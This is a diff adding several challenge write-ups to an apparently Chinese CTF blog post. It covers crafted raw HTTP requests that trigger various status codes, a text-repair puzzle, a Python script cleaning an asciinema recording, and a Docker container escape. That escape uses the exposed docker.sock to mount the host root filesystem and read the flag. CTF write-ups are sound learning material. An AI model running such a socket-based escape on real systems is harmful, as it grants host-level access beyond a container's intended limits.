@@ -369,6 +369,204 @@ setInterval(clean, 1000)
 
 ![](Screenshot_20231107_213636.webp)
 
+## 🌐 HTTP 集邮册
+
+这题是搜了半天 [MDN 文档](https://developer.mozilla.org/zh-CN/docs/Web/HTTP) 以及瞎碰瞎撞做出来的（x
+
+### 12 种状态码集邮！
+
+#### [200 OK](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status/200)
+
+~~送分题~~
+
+```
+GET / HTTP/1.1\r\n
+Host: example.com\r\n\r\n
+```
+
+#### [100 Continue](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status/100)
+
+```
+GET / HTTP/1.1\r\n
+Host: example.com\r\n
+Expect: 100-continue\r\n\r\n
+```
+
+#### [206 Partial Content](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status/206)
+
+限定返回数据范围，达到获取 Partial Content (部分内容) 的效果。
+
+```
+GET / HTTP/1.1\r\n
+Host: example.com\r\n
+Range: bytes=0-10\r\n\r\n
+```
+
+#### [304 Not Modified](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status/304)
+
+根据 [If-None-Match](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/If-None-Match) 的 Header 介绍，在 `If-None-Match` 中的 `ETag` 值匹配的话，即为验证失败，则服务端会返回 `304` 状态码。
+
+根据 nginx 返回的响应头 ETag 显示为 `64dbafc8-267`，则可根据语法 `If-None-Match: <etag_value>` 构造以下请求头：
+
+```
+GET / HTTP/1.1\r\n
+Host: example.com\r\n
+If-None-Match: "64dbafc8-267"\r\n\r\n
+```
+
+#### [400 Bad Request](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status/400)
+
+送分题，随便扔个不是 HTTP 请求头的东西进去就好了（
+
+```
+1145141919810\r\n\r\n
+```
+
+#### [404 Not Found](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status/404)
+
+也是送分题，随便扔个不存在的路径进去就好了（
+
+```
+GET /114514 HTTP/1.1\r\n
+Host: example.com\r\n\r\n
+```
+
+#### [405 Method Not Allowed](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status/405)
+
+给它来个 POST 就好（
+
+```
+POST / HTTP/1.1\r\n
+Host: example.com\r\n\r\n
+```
+
+#### [412 Precondition Failed](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status/412)
+
+跟上面 304 比较类似，上面是 `If-None-Match` 匹配上返回 `304`，这里是 [If-Match](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/If-Match) 没匹配上返回 `412`。
+
+根据语法 `If-Match: <etag_value>` 可以随便个构造类似以下的请求头传上去：
+
+```
+GET / HTTP/1.1\r\n
+Host: example.com\r\n
+If-Match: "114514"\r\n\r\n
+```
+
+#### [414 URI Too Long](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status/414)
+
+给它传个超级超级长的路径就好了（
+
+```
+GET /<long_string> HTTP/1.1\r\n
+Host: example.com\r\n\r\n
+```
+
+自行把 `<long_string>` 替换成一个超级超级长的字符串就好了（x
+
+#### [416 Range Not Satisfiable](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status/416)
+
+根据请求头 [Range](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Range) 的描述，在传入一个不合法的范围时，就会返回 `416` 状态码。
+
+也就是我们传入一个超过返回内容大小的范围就好了，可以构造以下请求头：
+
+```
+GET / HTTP/1.1\r\n
+Host: example.com\r\n
+Range: bytes=114514-\r\n\r\n
+```
+
+#### [501 Not Implemented](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status/501)
+
+这个得参考 Nginx 源码 [src/http/ngx_http_request.c#L1993,L2011](https://github.com/nginx/nginx/blob/a13ed7f5ed5bebdc0b9217ffafb75ab69f835a84/src/http/ngx_http_request.c#L1993,L2011)。
+
+可见在请求头传入的 `Transfer-Encoding` 不受支持时，便会返回 `501` 状态码，即可构造一个不存在的 `Encoding` 进行请求操作即可。
+
+```
+GET / HTTP/1.1\r\n
+Host: example.com\r\n
+Transfer-Encoding: majik\r\n\r\n
+```
+
+#### [505 HTTP Version Not Supported](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status/505)
+
+传入一个不受默认值配置 Nginx 支持的 HTTP 版本就好。
+
+```
+GET / HTTP/2077\r\n
+Host: example.com\r\n\r\n
+```
+
+#### 总结
+
+其实 `501 Not Implemented` 是非预期解，取而代之的预期解是 `413 Content Too Large`，但我没想到能传入一个唬人的 `Content-Length` 就能解决的（x
+
+### 没有状态……哈？
+
+这个还是误打误撞试出来的，我就试了一下不传入 HTTP 版本会怎样，结果试出来了一个 HTTP/0.9 的这个~~特性~~。
+
+可参考 [What is HTTP/0.9 request?](https://superuser.com/a/1504534) 以及 [w3.org 定义](https://www.w3.org/Protocols/HTTP/AsImplemented.html)
+
+```
+GET /\r\n\r\n
+```
+
+## 💻 Docker for Everyone
+
+本人通过参考文章 [技术干货 | Docker 容器逃逸案例汇集](https://zhuanlan.zhihu.com/p/191373337)，猜测可能宿主 Docker 的 sock 及本体映射进去了，便进行了以下操作。
+
+```bash
+docker -H unix:///var/run/docker.sock run -it -v /:/host alpine /bin/ash  # 调用宿主机的 docker 开启新的容器，并挂在根目录至 /host，并运行 ash
+cat /host`readlink -f /host/flag`  # 获取 flag
+```
+
+~~但实际上是因为用户直接处于 docker 用户组中，可以直接操作宿主的 docker。~~
+
+## 🧮 惜字如金 2.0
+
+这题非常简单，按照题目的指引去做就好了。
+
+我的方法是先都以 *creat 原则* 进行，在混淆字典每一行后面全补上一个 `e`。然后根据 flag 的格式要求: `flag\{[\w\-]+\}`~~（不知道怎么表达就直接用 RegEx 表示一下）~~，如果对应的字符偏移了就去掉补上的 `e`，利用 *referer 原则* 进行修补。
+
+修补完之后就能获得对应的 flag 了。
+
+## 🪐 高频率星球
+
+这道题我拿到文件后就看看能不能打开来直接操作~~（然后发现真可以）~~，虽然可以直接操作，但是还是有一堆控制字符在，于是我随便写了个 Python 脚本解题，最后手动修补一下就好了。
+
+```python
+import re
+
+PATTERN = re.compile(r"\u001b\[\??\d*[a-zA-Z]?")
+lines: list[str] = []
+
+HINTS = [
+    "\r\u001b[K \u001b[KESC\b\b\bESC\u001b[K[\b[\u001b[K6\b6\u001b[K~\b~\r\u001b[K",
+    "\r\u001b[K \u001b[KESC\b\b\bESC\u001b[K[\b[\u001b[K6\b6",
+    "\r\u001b[K \u001b[KESC\b\b\bESC\u001b[K[\b[",
+    "\u001b[K6\b6\u001b[K~\b~\r\u001b[K",
+    "\u001b[K~\b~\r\u001b[K",
+]  # 各种用来显示给人看不是给解释器看的东西
+
+with open("asciinema_restore.rec") as fp:
+    data = map(eval, fp.readlines()[1:])  # 跳过第一行信息
+for item in data:
+    line: str = item[2]  # 去除前面不必要的信息
+    for hint in HINTS:
+        line = line.replace(hint, "")  # 去除提示信息
+    line = PATTERN.sub("", (
+        line
+        .replace(":\u001b[K", "")
+        .replace("\b", "")
+    ))  # 去除各种控制符
+    if not line:
+        continue  # 去除空行
+    lines.append(line)  # 丢到待输出列表
+with open("result.txt", "w") as fp:
+    fp.writelines(lines)
+```
+
+~~（随便写的就不要奢求什么啦（x）~~
+
 # 未完待续
 
 心血来潮写了一部分，然后有点累了，后面再更x
